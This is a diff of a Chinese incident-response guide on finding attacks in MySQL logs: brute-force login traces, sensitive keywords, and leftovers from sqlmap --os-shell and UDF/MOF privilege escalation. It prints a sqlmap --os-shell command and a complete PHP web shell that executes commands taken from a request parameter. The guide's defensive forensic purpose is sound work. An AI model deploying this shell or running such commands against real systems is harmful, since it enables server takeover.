@@ -1,10 +1,10 @@
-## 第5篇:MySQL日志分析
+## 第5篇：MySQL 日志分析
 
-常见的数据库攻击包括弱口令、SQL注入、提升权限、窃取备份等。对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景及追溯攻击源。
+常见的数据库攻击包括弱口令、SQL 注入、提升权限、窃取备份等。对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景及追溯攻击源。
 
-### 0x01 Mysql日志分析
+### 0x01 MySQL 日志分析
 
-general query log能记录成功连接和每次执行的查询，我们可以将它用作安全布防的一部分，为故障分析或黑客事件后的调查提供依据。
+general query log 能记录成功连接和每次执行的查询，我们可以将它用作安全布防的一部分，为故障分析或黑客事件后的调查提供依据。
 
 ~~~
 1、查看log配置信息
@@ -12,7 +12,7 @@ show variables like '%general%';
 2、开启日志
 SET GLOBAL general_log = 'On';
 3、指定日志文件路径
-#SET GLOBAL general_log_file = '/var/lib/mysql/mysql.log';
+SET GLOBAL general_log_file = '/var/lib/mysql/mysql.log';
 ~~~
 
 比如，当我访问 /test.php?id=1，此时我们得到这样的日志：
@@ -25,19 +25,19 @@ SET GLOBAL general_log = 'On';
 ~~~
 我们按列来解析一下：
 ~~~
-第一列:Time，时间列，前面一个是日期,后面一个是小时和分钟，有一些不显示的原因是因为这些sql语句几乎是同时执行的,所以就不另外记录时间了。
-第二列:Id，就是show processlist出来的第一列的线程ID,对于长连接和一些比较耗时的sql语句,你可以精确找出究竟是那一条那一个线程在运行。
-第三列:Command，操作类型，比如Connect就是连接数据库，Query就是查询数据库(增删查改都显示为查询)，可以特定过虑一些操作。
-第四列:Argument，详细信息，例如 Connect    root@localhost on 意思就是连接数据库，如此类推,接下面的连上数据库之后,做了什么查询的操作。
+第一列：Time，时间列，前面一个是日期,后面一个是小时和分钟，有一些不显示的原因是因为这些 sql 语句几乎是同时执行的,所以就不另外记录时间了。
+第二列：：：Id，就是 show processlist 出来的第一列的线程 ID,对于长连接和一些比较耗时的 sql 语句,你可以精确找出究竟是那一条那一个线程在运行。
+第三列：：Command，操作类型，比如 Connect 就是连接数据库，Query 就是查询数据库(增删查改都显示为查询)，可以特定过虑一些操作。
+第四列：Argument，详细信息，例如 Connect root@localhost on 意思就是连接数据库，如此类推,接下面的连上数据库之后,做了什么查询的操作。
 ~~~
 
 ### 0x02 登录成功/失败
 
-我们来做个简单的测试吧，使用我以前自己开发的弱口令工具来扫一下，字典设置比较小，2个用户，4个密码，共8组。
+我们来做个简单的测试吧，使用我以前自己开发的弱口令工具来扫一下，字典设置比较小，2 个用户，4 个密码，共 8 组。
 
 ![](./image/log-5-1.png)
 
-MySQL中的log记录是这样子：
+MySQL 中的 log 记录是这样子：
 
 ~~~
 Time                 Id        Command         Argument
@@ -73,7 +73,7 @@ Time                 Id        Command         Argument
 
 但是，如果你是用其他方式，可能会有一点点不一样的哦。
 
-Navicat for MySQL登录：
+Navicat for MySQL 登录：
 
 ~~~
 190601 22:14:07	  106 Connect	root@192.168.204.1 on 
@@ -120,29 +120,37 @@ grep  "Access denied" mysql.log |cut -d "'" -f2|uniq -c|sort -nr
 
 在日志分析中，特别需要注意一些敏感的操作行为，比如删表、备库，读写文件等。关键词：drop table、drop function、lock tables、unlock tables、load_file() 、into outfile、into dumpfile。
 
-敏感数据库表：SELECT * from mysql.user、SELECT * from mysql.func
+敏感数据库表：
 
-### 0x03  SQL注入入侵痕迹
+```
+SELECT * from mysql.user、SELECT * from mysql.func
+```
 
-在利用SQL注入漏洞的过程中，我们会尝试利用sqlmap的--os-shell参数取得shell，如操作不慎，可能留下一些sqlmap创建的临时表和自定义函数。我们先来看一下sqlmap os-shell参数的用法以及原理：
+### 0x03  SQL 注入入侵痕迹
 
-1、构造一个SQL注入点，开启Burp监听8080端口
+在利用SQL注入漏洞的过程中，我们会尝试利用 sqlmap 的 --os-shell 参数取得shell，如操作不慎，可能留下一些sqlmap创建的临时表和自定义函数。我们先来看一下 sqlmap 的 --os-shell 参数的用法以及原理：
 
-`sqlmap.py  -u http://192.168.204.164/sql.php?id=1 --os-shell --proxy=http://127.0.0.1:8080`
+1、构造一个 SQL 注入点，开启 Burp 监听 8080 端口
 
-HTTP通讯过程如下：
+```
+sqlmap.py  -u http://192.168.204.164/sql.php?id=1 --os-shell --proxy=http://127.0.0.1:8080
+```
+
+HTTP 通讯过程如下：
 
 ![](./image/log-5-3.png)
 
-创建了一个临时文件tmpbwyov.php，通过访问这个木马执行系统命令，并返回到页面展示。
+创建了一个临时文件 tmpbwyov.php，通过访问这个木马执行系统命令，并返回到页面展示。
 
 tmpbwyov.php：
 
-<?php $c=$_REQUEST["cmd"];@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);$z=@ini_get('disable_functions');if(!empty($z)){$z=preg_replace('/[, ]+/',',',$z);$z=explode(',',$z);$z=array_map('trim',$z);}else{$z=array();}$c=$c." 2>&1\n";function f($n){global $z;return is_callable($n)and!in_array($n,$z);}if(f('system')){ob_start();system($c);$w=ob_get_contents();ob_end_clean();}elseif(f('proc_open')){$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);$w=NULL;while(!feof($t[1])){$w.=fread($t[1],512);}@proc_close($y);}elseif(f('shell_exec')){$w=shell_exec($c);}elseif(f('passthru')){ob_start();passthru($c);$w=ob_get_contents();ob_end_clean();}elseif(f('popen')){$x=popen($c,r);$w=NULL;if(is_resource($x)){while(!feof($x)){$w.=fread($x,512);}}@pclose($x);}elseif(f('exec')){$w=array();exec($c,$w);$w=join(chr(10),$w).chr(10);}else{$w=0;}print "<pre>".$w."</pre>";?>`
+```
+<?php $c=$_REQUEST["cmd"];@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);$z=@ini_get('disable_functions');if(!empty($z)){$z=preg_replace('/[, ]+/',',',$z);$z=explode(',',$z);$z=array_map('trim',$z);}else{$z=array();}$c=$c." 2>&1\n";function f($n){global $z;return is_callable($n)and!in_array($n,$z);}if(f('system')){ob_start();system($c);$w=ob_get_contents();ob_end_clean();}elseif(f('proc_open')){$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);$w=NULL;while(!feof($t[1])){$w.=fread($t[1],512);}@proc_close($y);}elseif(f('shell_exec')){$w=shell_exec($c);}elseif(f('passthru')){ob_start();passthru($c);$w=ob_get_contents();ob_end_clean();}elseif(f('popen')){$x=popen($c,r);$w=NULL;if(is_resource($x)){while(!feof($x)){$w.=fread($x,512);}}@pclose($x);}elseif(f('exec')){$w=array();exec($c,$w);$w=join(chr(10),$w).chr(10);}else{$w=0;}print "<pre>".$w."</pre>";?>
+```
 
-创建了一个临时表sqlmapoutput，调用存储过程执行系统命令将数据写入临时表，然后取临时表中的数据展示到前端。
+创建了一个临时表 sqlmapoutput ，调用存储过程执行系统命令将数据写入临时表，然后取临时表中的数据展示到前端。
 
-通过查看网站目录中最近新建的可疑文件，可以判断是否发生过sql注入漏洞攻击事件。
+通过查看网站目录中最近新建的可疑文件，可以判断是否发生过 sql 注入漏洞攻击事件。
 
 检查方法：
 
@@ -150,17 +158,20 @@ tmpbwyov.php：
 
 ![](./image/log-5-4.png)
 
-2、检查是否有UDF提权、MOF提权痕迹
+2、检查是否有 UDF 提权、MOF 提权痕迹
 
 检查目录是否有异常文件
 
+```
 mysql\lib\plugin 
-
 c:/windows/system32/wbem/mof/
+```
 
 检查函数是否删除
 
-`select * from mysql.func`
+```
+select * from mysql.func
+```
 
-3、结合web日志分析。
+3、结合 Web 日志分析。
 
